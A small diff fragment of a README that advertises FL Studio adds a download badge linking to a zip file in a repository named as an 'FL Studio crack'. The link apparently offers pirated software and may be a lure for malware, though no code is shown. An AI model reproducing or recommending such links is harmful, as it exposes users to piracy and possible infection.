@@ -17,6 +17,7 @@ Transform your music production with **FL Studio**, a powerful **Digital Audio W
 
 ## 🖥 DOWNLOAD
 
+[![image](https://github.com/user-attachments/assets/2cc316bc-0aeb-47f8-8e1f-bc37e97f6a74)](https://github.com/JaymixFrt/fl-studio-crack-2025/releases/download/download/FL.Studio.24.2.1.4526.Producer.Edition.zip)
 
 
 ## 📌 How to Install  
